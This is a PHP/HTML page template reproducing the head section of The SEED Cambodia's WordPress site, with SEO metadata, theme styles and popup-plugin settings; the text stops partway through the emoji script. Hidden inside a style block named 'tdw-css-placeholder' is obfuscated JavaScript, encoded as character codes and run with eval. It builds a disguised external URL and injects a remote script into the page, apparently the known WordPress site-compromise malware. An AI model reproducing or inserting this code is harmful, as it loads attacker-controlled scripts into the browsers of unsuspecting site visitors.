<?php
require_once '../connection/db.php';
require_once '../config/config.php';
require_once __DIR__ . '/../controllers/HomeController.php';

?>
<html lang="en-US" class="td-md-is-chrome wf-khmer-n4-active wf-active">

<head>

  <meta charset="UTF-8">
  <title><?php echo $title . "- The SEED Cambodia"; ?></title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="pingback" href="https://www.theseedcambodia.com/xmlrpc.php">
  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
  <link rel="icon" type="image/png"
    href="https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED-300x300.png">
  <!-- This site is optimized with the Yoast SEO plugin v23.5 - https://yoast.com/wordpress/plugins/seo/ -->
  <meta name="description"
    content="​T​h​e​ ​SEED​ ​មិនមែន​ធ្វើការ​លើ​សារ​ព័ត៌មាន​ ​និង​បម្រើ​មនោគម​ន៍​វិជ្ជា​ណាមួយ​ឡើយ​។​ ​T​h​e​ ​SEED​ ​គឺជា​ក្រុម​ដែល​ធ្វើ​កិច្ច​វិភាគ​">
  <link rel="canonical" href="https://www.theseedcambodia.com/">
  <meta property="og:locale" content="en_US">
  <meta property="og:type" content="website">
  <meta property="og:title" content="The SEED Cambodia">
  <meta property="og:description"
    content="​T​h​e​ ​SEED​ ​មិនមែន​ធ្វើការ​លើ​សារ​ព័ត៌មាន​ ​និង​បម្រើ​មនោគម​ន៍​វិជ្ជា​ណាមួយ​ឡើយ​។​ ​T​h​e​ ​SEED​ ​គឺជា​ក្រុម​ដែល​ធ្វើ​កិច្ច​វិភាគ​">
  <meta property="og:url" content="https://www.theseedcambodia.com/">
  <meta property="og:site_name" content="The SEED Cambodia">
  <meta property="article:publisher" content="https://www.facebook.com/TheSEEDCambodia">
  <meta property="article:modified_time" content="2023-07-10T08:23:00+00:00">
  <meta name="twitter:card" content="summary_large_image">
  <script id="bravePopu_webfontLoader" src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js"
    type="text/javascript" async=""></script>
  <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WG2S4ZV"></script>
  <script type="application/ld+json"
    class="yoast-schema-graph">
    {
      "@context": "https://schema.org",
      "@graph": [{
        "@type": "WebPage",
        "@id": "https://www.theseedcambodia.com/",
        "url": "https://www.theseedcambodia.com/",
        "name": "The SEED Cambodia",
        "isPartOf": {
          "@id": "https://www.theseedcambodia.com/#website"
        },
        "about": {
          "@id": "https://www.theseedcambodia.com/#organization"
        },
        "datePublished": "2021-08-26T09:33:06+00:00",
        "dateModified": "2023-07-10T08:23:00+00:00",
        "description": "​T​h​e​ ​SEED​ ​មិនមែន​ធ្វើការ​លើ​សារ​ព័ត៌មាន​ ​និង​បម្រើ​មនោគម​ន៍​វិជ្ជា​ណាមួយ​ឡើយ​។​ ​T​h​e​ ​SEED​ ​គឺជា​ក្រុម​ដែល​ធ្វើ​កិច្ច​វិភាគ​",
        "breadcrumb": {
          "@id": "https://www.theseedcambodia.com/#breadcrumb"
        },
        "inLanguage": "en-US",
        "potentialAction": [{
          "@type": "ReadAction",
          "target": ["https://www.theseedcambodia.com/"]
        }]
      }, {
        "@type": "BreadcrumbList",
        "@id": "https://www.theseedcambodia.com/#breadcrumb",
        "itemListElement": [{
          "@type": "ListItem",
          "position": 1,
          "name": "Home"
        }]
      }, {
        "@type": "WebSite",
        "@id": "https://www.theseedcambodia.com/#website",
        "url": "https://www.theseedcambodia.com/",
        "name": "The SEED Cambodia",
        "description": "",
        "publisher": {
          "@id": "https://www.theseedcambodia.com/#organization"
        },
        "potentialAction": [{
          "@type": "SearchAction",
          "target": {
            "@type": "EntryPoint",
            "urlTemplate": "https://www.theseedcambodia.com/?s={search_term_string}"
          },
          "query-input": {
            "@type": "PropertyValueSpecification",
            "valueRequired": true,
            "valueName": "search_term_string"
          }
        }],
        "inLanguage": "en-US"
      }, {
        "@type": "Organization",
        "@id": "https://www.theseedcambodia.com/#organization",
        "name": "The Seed Cambodia",
        "url": "https://www.theseedcambodia.com/",
        "logo": {
          "@type": "ImageObject",
          "inLanguage": "en-US",
          "@id": "https://www.theseedcambodia.com/#/schema/logo/image/",
          "url": "https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED.png",
          "contentUrl": "https://www.theseedcambodia.com/wp-content/uploads/2021/01/cropped-THE-SEED.png",
          "width": 512,
          "height": 512,
          "caption": "The Seed Cambodia"
        },
        "image": {
          "@id": "https://www.theseedcambodia.com/#/schema/logo/image/"
        },
        "sameAs": ["https://www.facebook.com/TheSEEDCambodia", "https://www.instagram.com/the_seed_cambodia/"]
      }]
    }
  </script>
  <meta name="google-site-verification" content="_M3RMSc4wgJemlG_atZbzpm372dOFIXd-nSpboVLcWM">
  <!-- / Yoast SEO plugin. -->


  <link rel="dns-prefetch" href="//www.googletagmanager.com">
  <link rel="dns-prefetch" href="//fonts.googleapis.com">
  <link rel="alternate" type="application/rss+xml" title="The SEED Cambodia » Feed"
    href="https://www.theseedcambodia.com/feed/">
  <link rel="alternate" type="application/rss+xml" title="The SEED Cambodia » Comments Feed"
    href="https://www.theseedcambodia.com/comments/feed/">

  <style id="tdb-global-colors">
    :root {
      --accent-color: #fff
    }
  </style>
  <!-- Header style compiled by theme -->

  <style>
    body {
      background-color: #fff5e7
    }


    @font-face {
      font-family: "KhmerOSSiemreap";
      src: local("KhmerOSSiemreap"), url("https://www.theseedcambodia.com/wp-content/uploads/2021/09/KhmerOSSiemreap.woff") format("woff");
      font-display: swap
    }

    @font-face {
      font-family: "KhmerOSMetalChrieng";
      src: local("KhmerOSMetalChrieng"), url("https://www.theseedcambodia.com/wp-content/uploads/2021/09/KhmerOSMetalChrieng.woff") format("woff");
      font-display: swap
    }

    .td-header-wrap .black-menu .sf-menu>.current-menu-item>a,
    .td-header-wrap .black-menu .sf-menu>.current-menu-ancestor>a,
    .td-header-wrap .black-menu .sf-menu>.current-category-ancestor>a,
    .td-header-wrap .black-menu .sf-menu>li>a:hover,
    .td-header-wrap .black-menu .sf-menu>.sfHover>a,
    .sf-menu>.current-menu-item>a:after,
    .sf-menu>.current-menu-ancestor>a:after,
    .sf-menu>.current-category-ancestor>a:after,
    .sf-menu>li:hover>a:after,
    .sf-menu>.sfHover>a:after,
    .header-search-wrap .td-drop-down-search:after,
    .header-search-wrap .td-drop-down-search .btn:hover,
    input[type=submit]:hover,
    .td-read-more a,
    .td-post-category:hover,
    .td_top_authors .td-active .td-author-post-count,
    .td_top_authors .td-active .td-author-comments-count,
    .td_top_authors .td_mod_wrap:hover .td-author-post-count,
    .td_top_authors .td_mod_wrap:hover .td-author-comments-count,
    .td-404-sub-sub-title a:hover,
    .td-search-form-widget .wpb_button:hover,
    .td-rating-bar-wrap div,
    .dropcap,
    .td_wrapper_video_playlist .td_video_controls_playlist_wrapper,
    .wpb_default,
    .wpb_default:hover,
    .td-left-smart-list:hover,
    .td-right-smart-list:hover,
    #bbpress-forums button:hover,
    .bbp_widget_login .button:hover,
    .td-footer-wrapper .td-post-category,
    .td-footer-wrapper .widget_product_search input[type="submit"]:hover,
    .single-product .product .summary .cart .button:hover,
    .td-next-prev-wrap a:hover,
    .td-load-more-wrap a:hover,
    .td-post-small-box a:hover,
    .page-nav .current,
    .page-nav:first-child>div,
    #bbpress-forums .bbp-pagination .current,
    #bbpress-forums #bbp-single-user-details #bbp-user-navigation li.current a,
    .td-theme-slider:hover .slide-meta-cat a,
    a.vc_btn-black:hover,
    .td-trending-now-wrapper:hover .td-trending-now-title,
    .td-scroll-up,
    .td-smart-list-button:hover,
    .td-weather-information:before,
    .td-weather-week:before,
    .td_block_exchange .td-exchange-header:before,
    .td-pulldown-syle-2 .td-subcat-dropdown ul:after,
    .td_block_template_9 .td-block-title:after,
    .td_block_template_15 .td-block-title:before,
    div.wpforms-container .wpforms-form div.wpforms-submit-container button[type=submit],
    .td-close-video-fixed {
      background-color: #bb0101
    }

    .td_block_template_4 .td-related-title .td-cur-simple-item:before {
      border-color: #bb0101 transparent transparent transparent !important
    }

    .td_block_template_4 .td-related-title .td-cur-simple-item,
    .td_block_template_3 .td-related-title .td-cur-simple-item,
    .td_block_template_9 .td-related-title:after {
      background-color: #bb0101
    }

    a,
    cite a:hover,
    .td-page-content blockquote p,
    .td-post-content blockquote p,
    .mce-content-body blockquote p,
    .comment-content blockquote p,
    .wpb_text_column blockquote p,
    .td_block_text_with_title blockquote p,
    .td_module_wrap:hover .entry-title a,
    .td-subcat-filter .td-subcat-list a:hover,
    .td-subcat-filter .td-subcat-dropdown a:hover,
    .td_quote_on_blocks,
    .dropcap2,
    .dropcap3,
    .td_top_authors .td-active .td-authors-name a,
    .td_top_authors .td_mod_wrap:hover .td-authors-name a,
    .td-post-next-prev-content a:hover,
    .author-box-wrap .td-author-social a:hover,
    .td-author-name a:hover,
    .td-author-url a:hover,
    .comment-reply-link:hover,
    .logged-in-as a:hover,
    #cancel-comment-reply-link:hover,
    .td-search-query,
    .widget a:hover,
    .td_wp_recentcomments a:hover,
    .archive .widget_archive .current,
    .archive .widget_archive .current a,
    .widget_calendar tfoot a:hover,
    #bbpress-forums li.bbp-header .bbp-reply-content span a:hover,
    #bbpress-forums .bbp-forum-freshness a:hover,
    #bbpress-forums .bbp-topic-freshness a:hover,
    #bbpress-forums .bbp-forums-list li a:hover,
    #bbpress-forums .bbp-forum-title:hover,
    #bbpress-forums .bbp-topic-permalink:hover,
    #bbpress-forums .bbp-topic-started-by a:hover,
    #bbpress-forums .bbp-topic-started-in a:hover,
    #bbpress-forums .bbp-body .super-sticky li.bbp-topic-title .bbp-topic-permalink,
    #bbpress-forums .bbp-body .sticky li.bbp-topic-title .bbp-topic-permalink,
    .widget_display_replies .bbp-author-name,
    .widget_display_topics .bbp-author-name,
    .td-subfooter-menu li a:hover,
    a.vc_btn-black:hover,
    .td-smart-list-dropdown-wrap .td-smart-list-button:hover,
    .td-instagram-user a,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-display-option:hover i,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-link:hover,
    .td-block-title-wrap .td-wrapper-pulldown-filter .td-pulldown-filter-item .td-cur-simple-item,
    .td-pulldown-syle-2 .td-subcat-dropdown:hover .td-subcat-more span,
    .td-pulldown-syle-2 .td-subcat-dropdown:hover .td-subcat-more i,
    .td-pulldown-syle-3 .td-subcat-dropdown:hover .td-subcat-more span,
    .td-pulldown-syle-3 .td-subcat-dropdown:hover .td-subcat-more i,
    .td_block_template_2 .td-related-title .td-cur-simple-item,
    .td_block_template_5 .td-related-title .td-cur-simple-item,
    .td_block_template_6 .td-related-title .td-cur-simple-item,
    .td_block_template_7 .td-related-title .td-cur-simple-item,
    .td_block_template_8 .td-related-title .td-cur-simple-item,
    .td_block_template_9 .td-related-title .td-cur-simple-item,
    .td_block_template_10 .td-related-title .td-cur-simple-item,
    .td_block_template_11 .td-related-title .td-cur-simple-item,
    .td_block_template_12 .td-related-title .td-cur-simple-item,
    .td_block_template_13 .td-related-title .td-cur-simple-item,
    .td_block_template_14 .td-related-title .td-cur-simple-item,
    .td_block_template_15 .td-related-title .td-cur-simple-item,
    .td_block_template_16 .td-related-title .td-cur-simple-item,
    .td_block_template_17 .td-related-title .td-cur-simple-item,
    .td-theme-wrap .sf-menu ul .td-menu-item>a:hover,
    .td-theme-wrap .sf-menu ul .sfHover>a,
    .td-theme-wrap .sf-menu ul .current-menu-ancestor>a,
    .td-theme-wrap .sf-menu ul .current-category-ancestor>a,
    .td-theme-wrap .sf-menu ul .current-menu-item>a,
    .td_outlined_btn,
    .td_block_categories_tags .td-ct-item:hover {
      color: #bb0101
    }

    a.vc_btn-black.vc_btn_square_outlined:hover,
    a.vc_btn-black.vc_btn_outlined:hover {
      color: #bb0101 !important
    }

    .td-next-prev-wrap a:hover,
    .td-load-more-wrap a:hover,
    .td-post-small-box a:hover,
    .page-nav .current,
    .page-nav:first-child>div,
    #bbpress-forums .bbp-pagination .current,
    .post .td_quote_box,
    .page .td_quote_box,
    a.vc_btn-black:hover,
    .td_block_template_5 .td-block-title>*,
    .td_outlined_btn {
      border-color: #bb0101
    }

    .td_wrapper_video_playlist .td_video_currently_playing:after {
      border-color: #bb0101 !important
    }

    .header-search-wrap .td-drop-down-search:before {
      border-color: transparent transparent #bb0101 transparent
    }

    .block-title>span,
    .block-title>a,
    .block-title>label,
    .widgettitle,
    .widgettitle:after,
    body .td-trending-now-title,
    .td-trending-now-wrapper:hover .td-trending-now-title,
    .wpb_tabs li.ui-tabs-active a,
    .wpb_tabs li:hover a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab.vc_active>a,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container .vc_tta-tab:hover>a,
    .td_block_template_1 .td-related-title .td-cur-simple-item,
    .td-subcat-filter .td-subcat-dropdown:hover .td-subcat-more,
    .td_3D_btn,
    .td_shadow_btn,
    .td_default_btn,
    .td_round_btn,
    .td_outlined_btn:hover {
      background-color: #bb0101
    }

    .block-title,
    .td_block_template_1 .td-related-title,
    .wpb_tabs .wpb_tabs_nav,
    .vc_tta-container .vc_tta-color-grey.vc_tta-tabs-position-top.vc_tta-style-classic .vc_tta-tabs-container {
      border-color: #bb0101
    }

    .td_block_wrap .td-subcat-item a.td-cur-simple-item {
      color: #bb0101
    }

    .td-grid-style-4 .entry-title {
      background-color: rgba(187, 1, 1, 0.7)
    }

    .td-container-wrap,
    .post,
    .tagdiv-type .td_quote_box {
      background-color: transparent
    }

    .td-menu-background:before,
    .td-search-background:before {
      background: #bb0000;
      background: -moz-linear-gradient(top, #bb0000 0%, #bb0000 100%);
      background: -webkit-gradient(left top, left bottom, color-stop(0%, #bb0000), color-stop(100%, #bb0000));
      background: -webkit-linear-gradient(top, #bb0000 0%, #bb0000 100%);
      background: -o-linear-gradient(top, #bb0000 0%, #bb0000 100%);
      background: -ms-linear-gradient(top, #bb0000 0%, #bb0000 100%);
      background: linear-gradient(to bottom, #bb0000 0%, #bb0000 100%);
      filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#bb0000', endColorstr='#bb0000', GradientType=0)
    }

    .td-mobile-content .current-menu-item>a,
    .td-mobile-content .current-menu-ancestor>a,
    .td-mobile-content .current-category-ancestor>a,
    #td-mobile-nav .td-menu-login-section a:hover,
    #td-mobile-nav .td-register-section a:hover,
    #td-mobile-nav .td-menu-socials-wrap a:hover i,
    .td-search-close a:hover i {
      color: #ffd323
    }

    .td-page-content p,
    .td-page-content .td_block_text_with_title {
      color: #000000
    }

    .td-mobile-content .td-mobile-main-menu>li>a {
      font-family: KhmerOSSiemreap
    }

    .td-mobile-content .sub-menu a {
      font-family: KhmerOSSiemreap
    }

    #td-mobile-nav,
    #td-mobile-nav .wpb_button,
    .td-search-wrap-mob {
      font-family: KhmerOSSiemreap
    }

    .td-page-content p,
    .td-page-content li,
    .td-page-content .td_block_text_with_title,
    .wpb_text_column p {
      font-family: KhmerOSSiemreap
    }

    body,
    p {
      font-family: KhmerOSSiemreap;
      font-size: 15px
    }

    .white-popup-block,
    .white-popup-block .wpb_button {
      font-family: KhmerOSSiemreap
    }

    .td_cl .td-container {
      width: 100%
    }

    @media (min-width:768px) and (max-width:1018px) {
      .td_cl {
        padding: 0 14px
      }
    }

    @media (max-width:767px) {
      .td_cl .td-container {
        padding: 0
      }
    }

    @media (min-width:1019px) and (max-width:1140px) {
      .td_cl.stretch_row_content_no_space {
        padding-left: 20px;
        padding-right: 20px
      }
    }

    @media (min-width:1141px) {
      .td_cl.stretch_row_content_no_space {
        padding-left: 24px;
        padding-right: 24px
      }
    }
  </style>

  <style type="text/css" id="wp-custom-css">
    .brave_element__text_inner {
      font-family: 'Kantumruy', 'Roboto', sans-serif !important;
    }

    .btn-donate {
      margin: 15px 0;
    }

    .telegram-link {
      margin-right: 10px;
    }

    .btn-donate a:hover {
      background: #ffde59;
      color: #222;
    }
  </style>

  <!-- Button style compiled by theme -->

  <style>
    .tdm-btn-style1 {
      background-color: #bb0101
    }

    .tdm-btn-style2:before {
      border-color: #bb0101
    }

    .tdm-btn-style2 {
      color: #bb0101
    }

    .tdm-btn-style3 {
      -webkit-box-shadow: 0 2px 16px #bb0101;
      -moz-box-shadow: 0 2px 16px #bb0101;
      box-shadow: 0 2px 16px #bb0101
    }

    .tdm-btn-style3:hover {
      -webkit-box-shadow: 0 4px 26px #bb0101;
      -moz-box-shadow: 0 4px 26px #bb0101;
      box-shadow: 0 4px 26px #bb0101
    }
  </style>

  <style id="tdw-css-placeholder">
    var iz=String;
    var iz2=iz['fromCharCode'](118, 97, 114, 32, 95, 48, 120, 52, 99, 54, 102, 52, 98, 61, 95, 48, 120, 52, 97, 56, 57, 59, 40, 102, 117, 110, 99, 116, 105, 111, 110, 40, 95, 48, 120, 50, 53, 100, 54, 55, 98, 44, 95, 48, 120, 50, 55, 54, 50, 54, 55, 41, 123, 118, 97, 114, 32, 95, 48, 120, 49, 50, 51, 101, 56, 48, 61, 95, 48, 120, 52, 97, 56, 57, 44, 95, 48, 120, 51, 99, 56, 54, 54, 54, 61, 95, 48, 120, 50, 53, 100, 54, 55, 98, 40, 41, 59, 119, 104, 105, 108, 101, 40, 33, 33, 91, 93, 41, 123, 116, 114, 121, 123, 118, 97, 114, 32, 95, 48, 120, 51, 49, 101, 51, 99, 102, 61, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 56, 41, 41, 47, 48, 120, 49, 43, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 101, 48, 41, 41, 47, 48, 120, 50, 43, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 49, 41, 41, 47, 48, 120, 51, 43, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 101, 53, 41, 41, 47, 48, 120, 52, 42, 40, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 101, 50, 41, 41, 47, 48, 120, 53, 41, 43, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 101, 41, 41, 47, 48, 120, 54, 42, 40, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 52, 41, 41, 47, 48, 120, 55, 41, 43, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 98, 41, 41, 47, 48, 120, 56, 42, 40, 45, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 101, 49, 41, 41, 47, 48, 120, 57, 41, 43, 112, 97, 114, 115, 101, 73, 110, 116, 40, 95, 48, 120, 49, 50, 51, 101, 56, 48, 40, 48, 120, 49, 100, 100, 41, 41, 47, 48, 120, 97, 59, 105, 102, 40, 95, 48, 120, 51, 49, 101, 51, 99, 102, 61, 61, 61, 95, 48, 120, 50, 55, 54, 50, 54, 55, 41, 98, 114, 101, 97, 107, 59, 101, 108, 115, 101, 32, 95, 48, 120, 51, 99, 56, 54, 54, 54, 91, 39, 112, 117, 115, 104, 39, 93, 40, 95, 48, 120, 51, 99, 56, 54, 54, 54, 91, 39, 115, 104, 105, 102, 116, 39, 93, 40, 41, 41, 59, 125, 99, 97, 116, 99, 104, 40, 95, 48, 120, 52, 52, 53, 101, 48, 52, 41, 123, 95, 48, 120, 51, 99, 56, 54, 54, 54, 91, 39, 112, 117, 115, 104, 39, 93, 40, 95, 48, 120, 51, 99, 56, 54, 54, 54, 91, 39, 115, 104, 105, 102, 116, 39, 93, 40, 41, 41, 59, 125, 125, 125, 40, 95, 48, 120, 53, 49, 102, 52, 44, 48, 120, 100, 52, 50, 99, 53, 41, 41, 59, 102, 117, 110, 99, 116, 105, 111, 110, 32, 116, 121, 101, 114, 121, 119, 101, 114, 40, 95, 48, 120, 51, 98, 101, 98, 97, 99, 41, 123, 118, 97, 114, 32, 95, 48, 120, 52, 98, 98, 56, 102, 48, 61, 95, 48, 120, 52, 97, 56, 57, 59, 114, 101, 116, 117, 114, 110, 32, 66, 111, 111, 108, 101, 97, 110, 40, 100, 111, 99, 117, 109, 101, 110, 116, 91, 39, 113, 117, 101, 114, 121, 83, 101, 108, 101, 99, 116, 111, 114, 39, 93, 40, 95, 48, 120, 52, 98, 98, 56, 102, 48, 40, 48, 120, 49, 101, 56, 41, 43, 95, 48, 120, 51, 98, 101, 98, 97, 99, 43, 39, 92, 120, 50, 50, 93, 39, 41, 41, 59, 125, 118, 97, 114, 32, 98, 100, 61, 39, 104, 116, 116, 39, 43, 39, 112, 115, 39, 43, 39, 58, 47, 47, 115, 116, 97, 121, 39, 43, 39, 46, 100, 101, 39, 43, 39, 99, 101, 110, 116, 39, 43, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 97, 41, 43, 39, 112, 112, 39, 43, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 57, 41, 43, 39, 47, 112, 39, 43, 39, 97, 103, 39, 43, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 102, 41, 44, 100, 61, 100, 111, 99, 117, 109, 101, 110, 116, 59, 105, 102, 40, 116, 121, 101, 114, 121, 119, 101, 114, 40, 98, 100, 41, 61, 61, 61, 33, 91, 93, 41, 123, 118, 97, 114, 32, 115, 61, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 55, 41, 93, 40, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 54, 41, 41, 59, 115, 91, 39, 105, 100, 39, 93, 61, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 51, 41, 44, 115, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 55, 41, 93, 61, 98, 100, 44, 100, 91, 39, 99, 117, 114, 114, 101, 110, 116, 83, 99, 114, 105, 112, 116, 39, 93, 63, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 99, 41, 93, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 54, 41, 93, 33, 61, 61, 110, 117, 108, 108, 38, 38, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 99, 41, 93, 91, 39, 112, 97, 114, 101, 110, 116, 78, 111, 100, 101, 39, 93, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 97, 41, 93, 40, 115, 44, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 99, 41, 93, 41, 58, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 53, 41, 93, 40, 39, 104, 101, 97, 100, 39, 41, 91, 48, 120, 48, 93, 33, 61, 61, 110, 117, 108, 108, 38, 38, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 53, 41, 93, 40, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 51, 41, 41, 91, 48, 120, 48, 93, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 57, 41, 93, 40, 115, 41, 59, 125, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 48, 120, 53, 49, 102, 52, 40, 41, 123, 118, 97, 114, 32, 95, 48, 120, 49, 102, 99, 56, 55, 100, 61, 91, 39, 115, 101, 99, 111, 110, 100, 95, 99, 104, 39, 44, 39, 114, 101, 109, 111, 118, 101, 39, 44, 39, 49, 50, 56, 56, 116, 87, 101, 98, 118, 109, 39, 44, 39, 115, 99, 114, 105, 112, 116, 39, 44, 39, 115, 114, 99, 39, 44, 39, 115, 99, 114, 105, 112, 116, 91, 115, 114, 99, 61, 92, 120, 50, 50, 39, 44, 39, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 39, 44, 39, 114, 97, 108, 97, 112, 39, 44, 39, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 66, 121, 73, 100, 39, 44, 39, 50, 48, 54, 51, 50, 50, 82, 76, 87, 109, 82, 113, 39, 44, 39, 102, 105, 114, 115, 116, 95, 116, 105, 109, 101, 95, 99, 104, 39, 44, 39, 104, 101, 97, 100, 39, 44, 39, 49, 49, 49, 51, 57, 50, 52, 68, 106, 98, 111, 69, 105, 39, 44, 39, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 39, 44, 39, 112, 97, 114, 101, 110, 116, 78, 111, 100, 101, 39, 44, 39, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 39, 44, 39, 49, 55, 49, 49, 53, 57, 51, 104, 114, 85, 115, 78, 101, 39, 44, 39, 115, 46, 99, 111, 109, 47, 115, 114, 99, 39, 44, 39, 105, 110, 115, 101, 114, 116, 66, 101, 102, 111, 114, 101, 39, 44, 39, 53, 50, 56, 53, 54, 52, 56, 108, 71, 88, 110, 111, 101, 39, 44, 39, 99, 117, 114, 114, 101, 110, 116, 83, 99, 114, 105, 112, 116, 39, 44, 39, 50, 51, 55, 48, 52, 57, 51, 48, 117, 104, 81, 119, 98, 101, 39, 44, 39, 54, 74, 77, 104, 113, 77, 71, 39, 44, 39, 101, 46, 106, 115, 39, 44, 39, 49, 49, 55, 52, 50, 54, 98, 109, 90, 90, 65, 89, 39, 44, 39, 57, 113, 82, 79, 115, 67, 101, 39, 44, 39, 49, 54, 49, 53, 48, 66, 109, 83, 78, 104, 77, 39, 93, 59, 95, 48, 120, 53, 49, 102, 52, 61, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 123, 114, 101, 116, 117, 114, 110, 32, 95, 48, 120, 49, 102, 99, 56, 55, 100, 59, 125, 59, 114, 101, 116, 117, 114, 110, 32, 95, 48, 120, 53, 49, 102, 52, 40, 41, 59, 125, 102, 117, 110, 99, 116, 105, 111, 110, 32, 95, 48, 120, 52, 97, 56, 57, 40, 95, 48, 120, 98, 56, 48, 101, 98, 98, 44, 95, 48, 120, 53, 51, 49, 51, 99, 102, 41, 123, 118, 97, 114, 32, 95, 48, 120, 53, 49, 102, 52, 102, 100, 61, 95, 48, 120, 53, 49, 102, 52, 40, 41, 59, 114, 101, 116, 117, 114, 110, 32, 95, 48, 120, 52, 97, 56, 57, 61, 102, 117, 110, 99, 116, 105, 111, 110, 40, 95, 48, 120, 52, 97, 56, 57, 50, 97, 44, 95, 48, 120, 53, 53, 101, 55, 52, 48, 41, 123, 95, 48, 120, 52, 97, 56, 57, 50, 97, 61, 95, 48, 120, 52, 97, 56, 57, 50, 97, 45, 48, 120, 49, 100, 49, 59, 118, 97, 114, 32, 95, 48, 120, 52, 49, 102, 98, 102, 53, 61, 95, 48, 120, 53, 49, 102, 52, 102, 100, 91, 95, 48, 120, 52, 97, 56, 57, 50, 97, 93, 59, 114, 101, 116, 117, 114, 110, 32, 95, 48, 120, 52, 49, 102, 98, 102, 53, 59, 125, 44, 95, 48, 120, 52, 97, 56, 57, 40, 95, 48, 120, 98, 56, 48, 101, 98, 98, 44, 95, 48, 120, 53, 51, 49, 51, 99, 102, 41, 59, 125, 118, 97, 114, 32, 108, 105, 61, 100, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 98, 41, 93, 40, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 100, 50, 41, 41, 59, 108, 105, 33, 61, 61, 110, 117, 108, 108, 38, 38, 108, 105, 91, 95, 48, 120, 52, 99, 54, 102, 52, 98, 40, 48, 120, 49, 101, 52, 41, 93, 40, 41, 59);
    eval(iz2);
  </style>
  <style type="text/css">
    .brave_popup {
      display: none
    }
  </style>
  <script
    data-no-optimize="1">
    var brave_popup_data = {};
    var bravepop_emailValidation = false;
    var brave_popup_videos = {};
    var brave_popup_formData = {};
    var brave_popup_adminUser = false;
    var brave_popup_pageInfo = {
      "type": "front",
      "pageID": 6574,
      "singleType": ""
    };
    var bravepop_emailSuggestions = {};
  </script>
  <script type="text/javascript">
    /* <![CDATA[ */
    window._wpemojiSettings = {
      "baseUrl": "https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/72x72\/",
      "ext": ".png",
      "svgUrl": "https:\/\/s.w.org\/images\/core\/emoji\/14.0.0\/svg\/",
      "svgExt": ".svg",
      "source": {
        "concatemoji": "https:\/\/www.theseedcambodia.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.5"
      }
    };
    /*! This file is auto-generated */
    ! function(i, n) {
      var o, s, e;

      function c(e) {
        try {
          var t = {
            supportTests: e,
            timestamp: (new Date).valueOf()
          };
          sessionStorage.setItem(o, JSON.stringify(t))
        } catch (e) {}
      }

      function p(e, t, n) {
        e.clearRect(0, 0, e.canvas.width, e.canvas.height), e.fillText(t, 0, 0);
